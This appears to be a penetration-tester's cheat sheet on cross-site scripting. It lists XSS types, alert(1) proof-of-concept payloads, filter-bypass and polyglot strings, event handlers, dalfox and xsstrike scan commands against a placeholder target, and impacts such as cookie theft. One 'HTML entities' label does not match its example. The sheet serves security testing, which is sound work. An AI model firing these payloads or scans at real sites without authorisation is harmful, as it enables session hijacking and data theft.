# XSS (Cross-Site Scripting)

## Types

### Reflected XSS
User input reflected in response without sanitization.

### Stored XSS
Malicious input stored and displayed to other users.

### DOM XSS
JavaScript processes user input without sanitization.

## Basic Payloads

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
```

## Filter Bypass

### Angle Brackets
```html
<svg onload=alert(1)>  <!-- HTML entities -->
<scr<script>ipt>alert(1)</scr</script>pt>  <!-- Nested -->
```

### Event Handlers
```html
onload, onerror, onfocus, onblur
onmouseover, onmouseout, onmousemove
onkeydown, onkeyup, onkeypress
```

### Polyglots
```html
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

## Automated Testing

```bash
# With dalfox
dalfox url https://target.com/?q=test

# With xsstrike
python3 xsstrike.py -u https://target.com/?q=test
```

## Contexts

| Context | Payload Type |
|---------|-------------|
| HTML | `<script>` tags |
| Attribute | `onload=alert(1)` |
| JavaScript | `'};alert(1);//` |
| URL | `javascript:alert(1)` |
| CSS | `style="x:expression(alert(1))"` |

## Impact Assessment

1. Session hijacking
2. Cookie theft
3. Keylogging
4. Phishing
5. Defacement
